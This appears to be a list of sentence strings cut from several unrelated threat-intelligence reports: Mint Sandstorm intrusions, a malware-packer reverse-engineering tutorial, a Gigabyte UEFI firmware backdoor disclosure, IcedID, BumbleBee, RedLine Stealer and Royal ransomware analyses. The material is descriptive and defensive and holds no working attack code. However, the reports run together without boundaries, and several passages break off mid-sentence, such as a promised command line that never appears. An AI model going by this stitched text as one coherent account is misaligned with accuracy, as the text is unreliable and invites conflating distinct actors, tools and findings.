            "In cases where Mint Sandstorm operators continue their pursuit of a given target, Microsoft typically observes one of two possible attack chains. ",
            "Figure 1.",
            "The two attack chains used by the Mint Sandstorm subgroup Attack chain 1: The Mint Sandstorm subgroup proceeds using Impacket to move laterally through a compromised organization and relies extensively on PowerShell scripts (rather than custom implants) to enumerate admin accounts and enable RDP connections.",
            "In this attack chain, the subgroup uses an SSH tunnel for command and control (C2), and the final objective in many cases is theft of the Active Directory database.",
            "If obtained, the Mint Sandstorm subgroup can use the Active Directory database to access credentials for users\u2019 accounts.",
            "In cases where users\u2019 credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users, possibly without attracting attention from defenders.",
            "The actors could also gain access to other systems where individuals may have reused their passwords. ",
            "Attack chain 2: As is the case in attack chain 1, the Mint Sandstorm subgroup uses Impacket to move laterally.",
            "However, in this progression, the operators use webhook.site for C2 and create scheduled tasks for persistence.",
            "Finally, in this attack chain, the actors deploy a custom malware variant, such as Drokbk or Soldier.",
            "These custom malware variants signal an increase in the subgroup\u2019s level of sophistication, as they shift from using publicly available tools and simple scripts to deploying fully custom developed malicious code. ",
            "Use of custom tools to evade detection ",
            "Since 2022,Microsoft has observed this Mint Sandstorm subgroup using two custom implants, detected by Microsoft security products as Drokbk and Soldier, to persist in target environments and deploy additional tools.",
            "Drobkbk and Soldier both use Mint Sandstorm-controlled GitHub repositories to host a domain rotator containing the operators\u2019 C2 domains.",
            "This allows Mint Sandstorm to dynamically update their C2 infrastructure, which may help the operators stay a step ahead of defenders using list-based domain blocking. ",
            "Drokbk: Drokbk.exe is a custom .NET implant with two components: an installer, sometimes accessed from a compressed archive on a legitimate file-sharing platform, and a secondary backdoor payload.",
            "The Drokbk backdoor issues a web request to obtain the contents of a README file on a Mint Sandstorm-controlled GitHub repo.",
            "The README file contains a list of URLs that direct targets to the C2 infrastructure associated with Drokbk. ",
            "Soldier: Soldier is a multistage .NET backdoor with the ability to download and run additional tools and uninstall itself.",
            "Like Drokbk, Soldier C2 infrastructure is stored on a domain rotator on a GitHub repository operated by Mint Sandstorm.",
            "Microsoft Threat Intelligence analysts assess that Soldier is a more sophisticated variant of Drokbk. ",
            "In certain cases, this Mint Sandstorm subgroup has used TTPs outside of these attack chains, notably when they have failed to achieve short-term objectives.",
            "In one instance, Microsoft also observed the subgroup using TTPs from both attack chains in a single compromised environment.",
            "However, in most cases, Mint Sandstorm activity displays one of the above discussed attack chains. ",
            "Low-volume phishing campaigns using template injection Microsoft has also observed this Mint Sandstorm subgroup using a distinct attack chain involving low-volume phishing campaigns and a third custom implant. ",
            "In these operations, the group crafts bespoke phishing emails, often purporting to contain information on security policies that affect countries in the Middle East, to deliver weaponized documents to individuals of interest.",
            "Recipients are typically individuals affiliated with high-profile think tanks or universities in Israel, North America, or Europe with ties to the security and policy communities.",
            "Unlike their initial exploitation of vulnerable internet-facing applications, which is largely indiscriminate and affects organizations across sectors and geographies, activity associated with this campaign was highly targeted and affected fewer than 10 organizations.. ",
            "The initial emails are most commonly lures designed to social engineer recipients into clicking a OneDrive link hosting a PDF spoofed to resemble information on a topic involving security or policy in the Middle East.",
            "The PDF contains a link to a macro-enabled template file (dotm) hosted on Dropbox.",
            "This file has been weaponized with macros to perform remote template injection, a technique that allows operators to obtain and launch a payload from a remote C2, often OneDrive.",
            "Template injection is an attractive option for adversaries looking to execute malicious code without drawing scrutiny from defenders.",
            "This technique can also be used to persist in a compromised environment if an adversary replaces a default template used by a common application. ",
            "In these attacks, Microsoft has observed the Mint Sandstorm subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns. ",
            "CharmPower is a modular backdoor written in PowerShell that this subgroup delivers in phishing campaigns that rely on template injection.",
            "CharmPower can read files, gather information on an infected host, and send details back to the attackers. ",
            "Reporting from Checkpoint indicates that at least one version of CharmPower pulls data from a specific text file that contains a hardcoded victim identifier. ",
            "Figure 2.",
            "Template injection technique What\u2019s next Capabilities observed in intrusions attributed to this Mint Sandstorm subgroup are concerning as they allow operators to conceal C2 communication, persist in a compromised system, and deploy a range of post-compromise tools with varying capabilities.",
            "While effects vary depending on the operators\u2019 post-intrusion activities, even initial access can enable unauthorized access and facilitate further behaviors that may adversely impact the confidentiality, integrity, and availability of an environment.",
            "A successful intrusion creates liabilities and may harm an organization\u2019s reputation, especially those responsible for delivering services to others such as critical infrastructure providers, which Mint Sandstorm has targeted in the past. ",
            "As these operators increasingly develop and use sophisticated capabilities, organizations must develop corresponding defenses to harden their attack surfaces and raise costs for these operators.",
            "Microsoft will continue to monitor Mint Sandstorm activity and implement protections for our customers.",
            "The current detections, advanced detections, and IOCs in place across our security products are detailed below and shared with the broader security community to help detect and prevent further attacks. ",
            "Mitigation and protection guidance The techniques used by this subset of Mint Sandstorm can be mitigated through the following actions: ",
            "Hardening internet-facing assets and understanding your perimeter Organizations must identify and secure perimeter systems that attackers might use to access the network.",
            "Public scanning interfaces, such as Microsoft Defender External Attack Surface Management, can be used to improve data. ",
            "Vulnerabilities observed in recent campaigns attributed to this Mint Sandstorm subgroup that defenders can identify and mitigate include: IBM Aspera Faspex affected by CVE-2022-47986: Organizations can remediate CVE-2022-47986 by upgrading to Faspex 4.4.2 Patch Level 2 or using Faspex 5.x which does not contain this vulnerability.",
            "More details are available in IBM\u2019s security advisory here. ",
            "Zoho ManageEngine affected by CVE-2022-47966:",
            "Organizations using Zoho ManageEngine products vulnerable to CVE-2022-47966 should download and apply upgrades from the official advisory as soon as possible.",
            "Patching this vulnerability is useful beyond this specific campaign as several adversaries are exploiting CVE-2022-47966 for initial access. ",

            "This guidance is useful for any organization with vulnerable applications and useful beyond this specific campaign, as several adversaries exploit Log4Shell to obtain initial access. ",
            "This Mint Sandstorm subgroup has demonstrated its ability to rapidly adopt newly reported N-day vulnerabilities into its playbooks.",
            "To further reduce organizational exposure, Microsoft Defender for Endpoint customers can use the threat and vulnerability management capability to discover, prioritize, and remediate vulnerabilities and misconfigurations. ",

            "We learned the basics of assembly and how to use disassemblers.",
            "All of these tools and techniques are very important for reversing malware samples.",
            "Different sorts of malware have different capabilities and implementations.",

            "Following the technical information, we will demonstrate two hands-on analyses of packed malware. ",
            "Basic Terminology for Reverse Engineers to Know An executable file can conceal its true code through either encryption or compression.",
            "When the file is executed, some initial code usually called a stub, decrypts or decompresses the real code so it can be executed.",
            "These tools, that we will describe in this section, can be used by legitimate vendors that want to protect their software from piracy and copyright violations but threat actors also use these tools to evade detection and make the reversing engineering and analysis process harder. ",
            "Now, let\u2019s look at these four tools: a packer, crypter, protector, and a loader. ",
            "What\u2019s a Packer? Packers are often used to compress the payload so it will take less space on disk.",
            "While packers can be used for legitimate purposes, malware developers utilize packers to make the malicious payload smaller and avoid detection based on static malware analysis techniques. ",
            "Examples: UPX is an open-source packing algorithm. ",
            "MPRESS is a free packer. ",
            "Andromeda is a custom packer that makes reverse-engineering more difficult. ",
            "What\u2019s a Crypter? ",
            "Some security tools use signatures or keywords to detect malware.",
            "To avoid detection by these tools, malware developers can use crypters.",
            "A crypter encrypts the payload, so it will be harder for signature-based and standard anti-viruses to detect the malicious payload. ",
            "Examples: PEUNION EXECryptor What\u2019s a Protector? ",
            "For most threat actors, one of the goals they want to achieve is to evade detection, and if the malware is detected then make the analysis process harder for researchers.",
            "That\u2019s where protectors come into the picture \u2013 they offer many features that can make static and dynamic analysis tedious and time-consuming.",
            "Having said that, legitimate organizations can use protectors to protect their software from being cracked and manipulated. ",
            "Usually, protectors will encrypt the payload, remove and obfuscate imports, implement anti-debugging and anti-reversing techniques, and much more. Examples: Themida Enigma Protector VMProtect What\u2019s a Loader? ",
            "Packed malware samples are compressed and stored inside the final executable, which will extract and execute the malware.",
            "On the other hand, there are loaders that serve as the first stage of the attack, the payload of the malware can be part of the loader\u2019s file or it can be downloaded from a remote location (by the loader, also known as a Downloader).",
            "In addition, loaders can be used to set persistence and additional components needed for the execution of the malware.",
            "For example, Bazarloader is a sophisticated loader with multiple techniques that is used in attacks against high-profile organizations.",
            "Bazarloader delivers all sorts of threats, from spam to ransomware like Conti or Ryuk. ",
            "In many cases, malware is delivered by tools that implement some (or all) of the functionalities of packers, crypters, protects, and loaders \u2013- all to make the analysis harder.",
            "For example, Morphine has its loader and can encrypt the original file. ",
            "Deep Dive Into How Packers Work and Detection ",
            "Now let\u2019s focus on packers, how they work, how to identify packed files, and how to extract the packed payload that can contain malicious code. ",
            "How do packers work? ",
            "The packed file contains three main components: packed content, a new PE header, and a stub, as seen in the image below: Packed sample view. ",
            "The packers compress (and if it has the functionality of a crypter also encrypts) the original executable, which is saved in one of the sections of the final packed file.",
            "The entry point of the original file is relocated, and so is the Import Address Table (IAT).",
            "The stub is a small part of code that implements the decompression (and decryption) of the originally packed file.",
            "A new PE header is prepended to the packed file or modifies the existing header so it will be a valid executable. ",
            "How to detect packed files 1.",
            "Static detection When data is being compressed or encrypted, the output is not structured and resembles more random data, resulting in high entropy.",
            "In information theory, entropy is a measure of disorder/randomness.",
            "The calculation is done using logarithm with base 2, also known as Shannon entropy, the result is in units of bits, hence the range of entropy level for binary files is 0 to 8. ",
            "We can check the entropy of the file sections, and if one of them has a value of 7 or higher, there is a high probability that the file is packed. ",
            "Packers may change the final payload\u2019s section names, as seen in the screenshot below.",
            "But in most cases, malware authors will rename the sections to more commonly used names that will not give away the fact that the file is packed. ",
            "Multiple tools can be used to detect indicators of a sample being packed: PEstudio, DiE (Detect it Easy), CFF explorer, and more.",
            "There are many examples and tutorials that use these tools, so we will show another free tool that can be handy in this and later stages: radare2. ",
            "Viewing the section of a file (see technical analysis on this packer here). ",
            "Packed samples usually have very few imports as they don\u2019t rely on external libraries like other programs.",
            "When a file has a low number of imports, it strongly indicates that it contains another component that is dropped/loaded.",
            "However, malware developers can add \u201cdummy\u201d imports to mislead researchers. ",
            "Viewing the imports for a packed file; full analysis results here. ",
            "Reverse Engineering Example: Static Unpacking of UPX Packed Samples ",
            "Standard UPX packed samples can be identified by the section names, as long as they were not modified by the attackers.",
            "Let\u2019s take a look at a sample with MD5 5598febfbf00839c9f7047d9fe3205e3. ",
            "The section names of the files contain the UPX string, as seen in the screenshot below: We can use the UPX command line utility to extract the packed payload.",
            "The command to decompress a packed file is as follows: upx -d <packed>",
            "-o <extracted payload> ",
            "You can run the command on the sample and verify that the extracted file has MD5 6d13f5d287fd735a9bbc261aafb49006. ",
            "2.",
            "Dynamic detection When we dynamically analyze a packed file, we aim to extract the payload.",
            "Several functions can be a good place for putting a breakpoint and attempting to fetch the extraction process.",
            "Let\u2019s look at API calls and debuggers. ",
            "API Calls Essentially, all packers need to perform the following operations: allocate memory, change permissions, read the encrypted/packed chunk of code, decrypt it, load it to the allocated memory space and execute it.",
            "To make all of these actions, the program must use system calls because these actions require interaction with the kernel. ",
            "The relevant system calls are VirtualAlloc used for allocating memory in the current process.",
            "The memory is automatically initialized to zero.",
            "One of the arguments is dwSize \u2013 that\u2019s the size in bytes.",
            "Knowing the size can help identify when a program allocates big memory space, possibly for the unpacked payload. ",
            "VirtualProtect changes the permissions of the given virtual address.",
            "When malware wants to grant write or execute permissions flNewProtect argument will be set to PAGE_EXECUTE_READWRITE (0x40) or PAGE_EXECUTE_READ (0x20). ",
            "RtlDecompressBuffer decompresses the provided buffer. ",
            "CreateProcessInternalW creates a new process.",
            "In the context of malware execution, it can create a new threat with the malicious unpacked payload. ",
            "We can look for these system calls in the list of imported functions.",
            "However, malware authors usually try to hide these system calls.",
            "For instance, we will not see them in the imported function list, and they not even be part of the strings in the sample.",
            "In this case, the function and the corresponding library are dynamically loaded at runtime \u2013 also known as explicit linking. ",
            "In this case, dynamic debugging can be very helpful \u2013 debuggers like x64dbg let you put a breakpoint on function calls, even if the function is not imported.",
            "The breakpoint will be triggered if the system call is executed. ",
            "Debugger A debugger is a powerful tool that allows developers and researchers to follow and control the execution of a program.",
            "When debugging an executable, you can view the registers, stack, and memory and see how each instruction affects the stored data. ",
            "Debugging malware can reveal code executed only in runtime (meaning that you will not see it in standard static analysis).",
            "Debuggers also allow you to see how strings and payloads are deobfuscated and constructed \u2013 making it easier to find the interesting patterns of the malware. ",
            "Different debuggers can be used to debug Windows executables and DLLs: OllyDbg \u2013 not maintained anymore Windbg \u2013 powerful kernel-mode and user-mode debugger created by Microsoft. ",

            "For 32-bit executables, it\u2019s x32dbg. ",
            "The main difference between these debuggers is the implementation, which may result in certain behaviors, but for the most part, it\u2019s up to you to choose which debugger you prefer. ",
            "There are more tools for debugging (and analyzing) .NET",

            "These detections were driven by heuristic detection methods, which play an important role in detecting new, previously-unknown supply chain threats, where legitimate third-party technology products or updates have been compromised.",
            "Our follow-up analysis discovered that firmware in Gigabyte systems is dropping and executing a Windows native executable during the system startup process, and this executable then downloads and executes additional payloads insecurely.",
            "It uses the same techniques as other OEM backdoor-like features like Computrace backdoor (a.k.a. LoJack DoubleAgent) abused by threat actors and even firmware implants such as Sednit LoJax, MosaicRegressor, Vector-EDK.",
            "Subsequent analysis showed that this same code is present in hundreds of models of Gigabyte PCs.",
            "We are working with Gigabyte to address this insecure implementation of their app center capability. ",
            "In the interest of protecting organizations from malicious actors, we are also publicly disclosing this information and defensive strategies on a more accelerated timeline than a typical vulnerability disclosure.",
            "This backdoor appears to be implementing intentional functionality and would require a firmware update to completely remove it from affected systems.",
            "While our ongoing investigation has not confirmed exploitation by a specific threat actor, an active widespread backdoor that is difficult to remove poses a supply chain risk for organizations with Gigabyte systems.",
            "At a high level, the relevant attack vectors include: Compromise in the supply chain Compromise in the local environment Malware persistence via functionality of this firmware in systems A more detailed analysis of these risks is provided with suggested mitigations below.",
            "After a more traditional vulnerability disclosure timeline, we plan to publish details about how this works. ",
            "Key Findings There are two important aspects of our findings: Eclypsium automated heuristics detected firmware on Gigabyte systems that drops an executable Windows binary that is executed during the Windows startup process. ",
            "This executable binary insecurely downloads and executes additional payloads from the Internet. ",
            "Since many more issues like this continue to be discovered, Eclypsium is continuously running at-scale analysis of the information technology supply chain.",
            "Look for additional findings on this blog and the Eclypsium Platform for your organization. ",
            "Stage 1:",
            "Firmware dropping OS executable An initial analysis of the affected UEFI firmware identified the following file: 8ccbee6f7858ac6b92ce23594c9e2563ebcef59414b5ac13ebebde0c715971b2.bin ",
            "This is a Windows Native Binary executable embedded inside of UEFI firmware binary in a UEFI firmware volume with the following GUID: AEB1671D-019C-4B3B-BA-00-35-A2-E6-28-04-36. ",
            "This Windows executable is embedded into UEFI firmware and written to disk by firmware as part of the system boot process, a technique commonly used by UEFI implants and backdoors.",
            "During the Driver Execution Environment (DXE) phase of the UEFI firmware boot process, the \u201cWpbtDxe.efi\u201d firmware module uses the above GUID to load the embedded Windows executable file into memory, installing it into a WPBT ACPI table which will later be loaded and executed by the Windows Session Manager Subsystem (smss.exe) upon Windows startup.",
            "The \u201cWpbtDxe.efi\u201d module checks if the \u201cAPP Center Download & Install\u201d feature has been enabled in the BIOS/UEFI Setup before installing the executable into the WPBT ACPI table.",
            "Although this setting appears to be disabled by default, it was enabled on the system we examined. ",
            "This executable uses the Windows Native API to write the contents of an embedded executable to the file system at the following location: ",
            "%SystemRoot%\\system32\\GigabyteUpdateService.exe It then sets registry entries to run this executable as a Windows Service.",
            "The mechanism described here is similar to the methods used by other UEFI firmware implants such as LoJax, MosiacRegressor, MoonBounce, and Vector-EDK, referenced previously. ",
            "Stage 2: Downloading and running further executables ",
            "The dropped Windows executable is a .NET application.",
            "It downloads and runs an executable payload from one of the following locations, depending on how it\u2019s been configured: http://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://mb.download.gigabyte.com/FileList/Swhttp/LiveUpdate4 https://software-nas/Swhttp/LiveUpdate4 Plain HTTP (the first bullet above) should never be used for updating privileged code as it is easily compromised via Machine-in-the-middle (MITM) attacks.",
            "However, we noticed that even when using the HTTPS-enabled options, remote server certificate validation is not implemented correctly.",
            "Therefore, MITM is possible in that case also. ",
            "The firmware does not implement any cryptographic digital signature verification or any other validation over the executables.",
            "The dropped executable and the normally-downloaded Gigabyte tools do have a Gigabyte cryptographic signature that satisfies the code signing requirements of Microsoft Windows, but this does little to offset malicious use, especially if exploited using Living-off-the-Land techniques (like in the recent alert regarding Volt Typhoon attackers).",
            "As a result, any threat actor can use this to persistently infect vulnerable systems either via MITM or compromised infrastructure. Risks and Impact These issues expose organizations to a wide range of risks and attack scenarios. ",
            "Abuse of an OEM backdoor by threat actors \u2013 Previously, threat actors have taken advantage of legitimate but insecure/vulnerable \u201cOEM backdoor\u201d software built into the firmware of PCs.",
            "Most notably, Sednit group (APT28, FancyBear) exploited Computrace LoJack to masquerade as legitimate laptop anti-theft feature. ",
            "Compromise of the OEM update infrastructure and supply chain \u2013 Gigabyte does have documentation on their website for this feature so it may be legitimate, but we cannot confirm what is happening within Gigabyte.",
            "In August 2021, Gigabyte experienced a breach of critical data by the RansomEXX group and then experienced another breach in October 2021 by the AvosLocker group. ",
            "Persistence using UEFI Rootkits and Implants \u2013 UEFI rootkits and implants are some of the stealthiest and most powerful forms of malware in existence.",
            "They reside in firmware on motherboards or within EFI system partitions of storage media, and execute before the operating system, allowing them to completely subvert the OS and security controls running in higher layers.",
            "Additionally, since most of the UEFI code exists on the motherboard instead of storage drives, UEFI threats will easily persist even if drives are wiped and the OS is reinstalled.",
            "The rate of discovery of new UEFI rootkits has accelerated sharply in recent years as seen by the discovery of LoJax (2018), MosaicRegressor (2020), FinSpy (2021) ESPecter (2021), MoonBounce (2022), CosmicStrand (2022), and BlackLotus (2023).",
            "Most of these were used to enable persistence of other, OS-based malware.",
            "This Gigabyte firmware images and the persistently dropped Windows executable enable the same attack scenario.",
            "Often, the above implants made their native Windows executables look like legitimate update tools.",
            "In the case of MosaicRegressor, the Windows payload was named \u201cIntelUpdater.exe\u201d MITM attacks on firmware and software update features \u2013 Additionally, the insecure nature of the update process opens the door to MITM techniques via a compromised router, compromised device on the same network segment, DNS poisoning, or other network manipulation.",
            "It is also important to note that the third connection option, https://software-nas/Swhttp/LiveUpdate4 , is not a fully qualified domain name, but rather, a machine name that would presumably be on the local network.",
            "This means an attacker on a local subnet could trick the implant into connecting to their system, without the need for DNS spoofing. ",
            "Ongoing risk due to unwanted behavior within official firmware \u2013 Backdoors hidden within UEFI or other firmware can be hard to remove.",
            "Even if the backdoor executable is removed, the firmware will simply drop it again the next time the system boots up.",
            "This challenge was demonstrated before when trying to remove Computrace LoJack and relates to vulnerabilities in Lenovo Service Engine on notebooks and desktops. ",
            "Recommendations We recommend exercising caution when using Gigabyte systems or systems with affected motherboards.",
            "Organizations can also take the following actions to minimize the risk: Scan and monitor systems and firmware updates in order to detect affected Gigabyte systems and the backdoor-like tools embedded in firmware.",
            "Update systems to the latest validated firmware and software in order to address security issues like this one. Inspect and disable the \u201cAPP Center Download & Install\u201d feature in UEFI/BIOS Setup on Gigabyte systems and set a BIOS password to deter malicious changes. ",

            "The latest version, however, removed the SSH functionality part and now focuses exclusively on Telnet\u2014and with quite some success.",
            "In Q4 2022, we noticed 112k RapperBot infection attempts coming from over 2k unique IP addresses. ",
            "What sets RapperBot apart from other worms is its \u201cintelligent\u201d way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.",
            "This method speeds up the brute forcing process significantly because it doesn\u2019t have to go over a huge list of credentials. ",
            "RapperBot then determines the processor architecture and infects the device.",

",
            "According to Proofpoint, these new variants have been seen used by three distinct threat actors in seven campaigns since late last year, focusing on further payload delivery, most notably ransomware. ",
            "Proofpoint has identified two new variants of the IcedID loader, namely \u201cLite\u201d (first seen in November 2022) and \u201cForked\u201d (first observed in February 2023), both delivering the same IcedID bot with a more narrow-focused feature set. ",
            "Removing unneeded functions on IcedID, which has been deployed in numerous malicious campaigns without many code changes since 2017, makes it stealthier and leaner, which can help the threat actors evade detection. ",
            "Separate clusters of IcedID activity (Proofpoint) New IcedID campaigns Starting in November 2022, the \u201cLite\u201d variant of the IcedID loader was delivered as a second-stage payload on systems infected by the newly-returned Emotet malware. ",
            "The \u201cForked\u201d version of the malware loader first appeared in February 2023, distributed directly through thousands of personalized invoice-themed phishing emails. ",
            "These messages used Microsoft OneNote attachments (.one) to execute a malicious HTA file that, in turn, runs a PowerShell command which fetches IcedID from a remote resource.",
            "At the same time, the victim is served a decoy PDF. ",
            "Malicious OneNote attachment used in recent campaign (Proofpoint) ",
            "At the end of February, Proofpoint\u2019s researchers observed a low-volume campaign distributing IcedID \u201cForked\u201d via fake notices from the National Traffic and Motor Vehicle Safety Act and the U.S. Food and Drug Administration (FDA). ",
            "It is important to note that while some threat actors use new variants of the IcedID malware, others still choose to deploy the \u201cStandard\u201d variant, with one of the most recent campaigns dating March 10, 2023. ",
            "The new variants The \u201cForked\u201d IcedID loader is quite similar to the \u201cStandard\u201d version in terms of its role, sending basic host info to the C2 and then fetching the IcedID bot. ",
            "However, \u201cForked\u201d uses a different file type (COM Server) and features additional domain and string-decryption code, making the payload 12KB larger than the \u201cStandard\u201d version. ",
            "Domains decryption (Proofpoint) On the other hand, the \u201cLite\u201d loader variant is lighter, at 20KB, and does not exfiltrate host info to the C2.",
            "This change makes sense since it was deployed alongside Emotet, which had already profiled the breached system. ",
            "The \u201cForked\u201d version of the IcedID bot is 64KB smaller than the \u201cStandard\u201d bot, and is basically the same malware minus the web injects system, the AiTM (adversary in the middle) functions, and the backconnect capabilities that give threat actors remote access to infected devices. ",
            "Standard and Forked bot comparison (Proofpoint) IcedID is generally used for initial access by threat actors, so developing new variants is a worrying sign, signifying a shift towards specializing the bot to payload delivery. ",
            "Proofpoint predicts that most threat actors will continue to use the \u201cStandard\u201d variant, but the deployment of new IcedID versions will likely grow, and more variants may pop up later in 2023. "

            "In this intrusion from April 2022, the threat actors used BumbleBee as the initial access vector. ",
            "BumbleBee is a malware loader that was first reported by Google Threat Analysis Group in March 2022.",
            "Google TAG attributes this malware to an initial access broker (IAB) dubbed EXOTIC LILY, working with the cybercrime group FIN12/WIZARD SPIDER/DEV-0193.",
            "Read more about BumbleBee here, and here. ",
            "During this intrusion, the threat actors gained access using an ISO and LNK file, used several lateral movement techniques, dumped credentials three different ways, kerberoasted a domain admin account and dropped/executed a bespoke tool for discovering privilege escalation paths. ",
            "Case Summary In this intrusion, the threat actors operated in an environment over an 11 day dwell period.",
            "The intrusion began with a password protected zipped ISO file that we assess with medium to high confidence due to other reports, likely arrived via an email which included a link to download said zip file. ",
            "The execution phase started with that password protected zip, which after extracting would show the user an ISO file that after the user double clicks would mount like a CD or external media device on Windows and present the user with a single file named documents in the directory. ",
            "When the user double clicks or opens the lnk file, they inadvertently starts a hidden file in the directory, a DLL (namr.dll) containing the Bumblebee malware loader.",
            "From there, the loader reached out to the Bumblebee C2 server.",
            "At first, things remained fairly quiet, just C2 communications; until around 3 hours later, Bumblebee dropped a Cobalt Strike beacon named wab.exe on the beachhead host.",
            "This Cobalt Strike beacon was subsequently executed and then proceeded to inject into various other processes on the host (explorer.exe, rundll32.exe).",
            "From these injected processes, the threat actors began discovery tasks using Windows utilities like ping and tasklist. ",
            "Four hours after initial access, the threat actor started their first lateral movement using RDP to pivot to a server using the local Administrator account.",
            "The threat actor then deployed Anydesk, which was the only observed persistence mechanism used during the intrusion.",
            "The threat actor then started Active Directory mapping using Adfind. ",
            "After this activity, the threat actors went silent.",
            "Then, the next day, they accessed the server via RDP and deployed a bespoke tool, VulnRecon, designed to identify local privilege escalation paths on a Windows host.",
            "The tool appeared to be still under development as several command options were not yet implemented. ",
            "The next check in from the threat actors, occurred on the 4th day, where the threat actors again ran VulnRecon, but from the beachhead host instead of the server.",
            "AdFind was used again as well.",
            "Next, the threat actor transferred Sysinternals tool Procdump over SMB, to the ProgramData folders on multiple hosts in the environment.",
            "They then used remote services to execute Procdump, which was used to dump lsass.",
            "At this point, the actors appeared to be searching for more access then they currently had.",
            "While they were able to move laterally to workstations and at least one server, it seemed that they had not yet taken control of an account that provided them the access they were seeking, likely a Domain Administrator or similarly highly privileged account. ",
            "After that activity, the threat actors then disappeared until the 7th day, at which time they accessed the server via Anydesk.",
            "Again, they executed VulnRecon and then also executed Seatbelt, a red team tool for preforming various host based discovery. ",
            "On the final day of the intrusion, the 11th day since the initial entry by the threat actor, they appeared to be preparing to act on final objectives.",
            "The threat actors used PowerShell to download and execute a new Cobalt Strike PowerShell beacon in memory on the beachhead host.",
            "After injecting into various processes on the host, the threat actors executed the PowerShell script Invoke-Kerberoast.",
            "Next, they used yet another technique to dump LSASS on the beachhead host, this time using a built in Windows tool comsvcs.dll.",
            "AdFind was run for a 3rd time in the network, and then two batch scripts were dropped and run.",
            "These batch scripts\u2019 purposes were to identify all online servers and workstations in the environment, often a precursor to ransomware deployment by creating the target list for that deployment. ",
            "After the scripts ran, a new Cobalt Strike executable beacon was run on the beachhead.",
            "Next, the threat actors used a service account to execute a Cobalt Strike beacon remotely on a Domain Controller.",
            "This service account was most likely cracked offline after being kerberoasted earlier in the intrusion. ",
            "The threat actors were then evicted from the environment before any final actions could be taken.",
            "We assess based on the level of access and discovery activity from the final day the likely final actions would have been a domain wide ransom deployment. ",
            "Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.",
            "More information on this service and others can be found here. ",
            "We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. ",

            "The threat actors managed to get access to the beachhead host after the successful execution of a lnk file within an ISO, which are usually distributed through email campaigns. ",
            "The initial payload named BC_invoice_Report_CORP_46.iso, is an ISO image that once mounted, lures the user to open a document.lnk file which will execute the malicious DLL loader using the following command line: ",

            "It is typically distributed through phishing emails, social engineering tactics, and malicious URL links. ",
            "Since it was released, threat actors and adversaries have leveraged RedLine Stealer because of its availability and flexibility for stealing credentials that can cause financial loss and data leakage.",
            "In 2020, there was a RedLine campaign that targeted both enterprise and personal devices.",
            "Many industries received these malicious campaigns, but the most impacted was the Healthcare and manufacturing sectors.",
            "Recently this year (May 10, 2023), there was a RedLine campaign found by stormshield that used a malicious chrome extension that will download several malware like Smoke Loader and Amadey Trojan.",

            "Blog details include: Analysis of the phishing URLs The RedLine Loader The RedLine Stealer Capabilities Splunk Security Content Spear Phish Link Data The operators behind RedLine Stealer use several techniques to gain initial access to their victims.",
            "One common initial access technique that this Trojan Stealer uses is a phishing URL link.",
            "To gain more insight on how this malware executes its campaign, the Splunk Threat Research Team (STRT) collected 90 days of URL data from URLhaus and used Jupyter Notebooks to analyze the dataset to identify trends of the RedLine URL links.",
            "Figure 1 shows the list of URLs from the data related to RedLine Stealer.",
            "Based on URL tags, we can see that this Trojan is also bundled, downloaded or dropped by other malware like Amadey or SmokeLoader. ",

            "By: Ivan Nicole Chavez, Byron Gelera, Monte de Jesus, Don Ovid Ladores, Khristian Joseph Morales December 21, 2022Read time: ( words) Save to Folio Subscribe Royal ransomware may have been first observed by researchers around September 2022, but it has seasoned cybercriminals behind it: The threat actors running this ransomware \u2014 who used to be a part of Conti Team One, according to a mind map shared by Vitali Kremez \u2014 initially dubbed it Zeon ransomware, until they rebranded it to Royal ransomware.",
            "From September to December this year, we have detected multiple attacks from Royal ransomware, with the US and Brazil being the most targeted countries (Figure 1).",
            "This blog entry discusses in depth the findings from our investigation of samples of this new piece of ransomware, as well as the tools that Royal ransomware actors used to carry out their attacks. ",
            "Figure 1.",
            "Percentage of Royal ransomware attacks by country Infection Routine External reports mention that the Royal ransomware group uses callback phishing as a means of delivering their ransomware to victims (Figure 2).",
            "These phishing attacks contain a number that leads to a service hired by the threat actors.",
            "When contacted, they will use social engineering tactics to lure victims into installing remote access software. Figure 2.",
            "Royal ransomware\u2019s attack flow Installation Our investigation found that the ransomware actors used a compiled remote desktop malware, which was used to drop the tools they needed to infiltrate the victim\u2019s system: they used QakBot and Cobalt Strike for lateral movement, while NetScan was used to look for any remote systems connected to the network.",
            "Once they infiltrated the system, the ransomware actors used tools such as PCHunter, PowerTool, GMER, and Process Hacker to disable any security-related services running in the system.",
            "They then exfiltrate the victim\u2019s data via the RClone tool.",
            "We also observed an instance in which they used AdFind to look for active directories, then executed RDPEnable on the infected machine. ",
            "Payload Once everything has been set up, the ransomware actors used PsEXEC to execute the malware.",
            "The PsEXEC commands contain the ID of the victim, along with any argument that the actors applied to the ransomware.",
            "There were also instances of the malware actors using PsEXEC to enable the remote desktop protocol (RDP) of a target system before executing the ransomware. ",
            "Analysis ",
            "In part of our analysis, we used a ransomware sample with the detection name Ransom.Win64.YORAL.SMYXCJCT.",
            "As shown in Table 1, Figure 3, and Figure 4, Royal ransomware requires an argument of \u201c-id {32-byte characters}\u201d to execute on a victim\u2019s machine.",
            "It also accepts \u201c-path\u201d to specify a target file for encryption and \u201c-ep {value}\u201d to calculate the partial file encryption of large files. ",
            "In some earlier samples of the ransomware, the binary wouldn\u2019t parse all the arguments due to a bug in the code.",
            "For example, \u201c-path\u201d won't be processed if provided after the \"-id\" argument; if provided before, there will be no \"-id\" argument, so it will not proceed. ",
            "Argument Description -path {target path} If provided, will only encrypt the contents of the target path -id {32-byte characters} Will be used as the victim\u2019s ID, which will be appended on the TOR link found in the dropped ransom note.",
            "The process exists if not provided or if provided characters is not 32 bytes long -ep This argument is for the full or partial encryption of file routine Table 1.",

            "Arguments accepted by the ransomware binary Figure 4.",
            "Checking if length of provided \u201c-id\u201d is 32 bytes It enumerates files and directories for encryption using FindFirstFileW, FindNextFileW, and FindClose APIs (Figure 5). ",
            "Figure 5.",
            "File enumeration The ransomware looks for available network shares for network encryption by listing accessible local IPs, then uses NetShareEnum and attempts to connect on ADMIN$ and IPC$ shares (Figure 6). ",
            "Figure 6.",
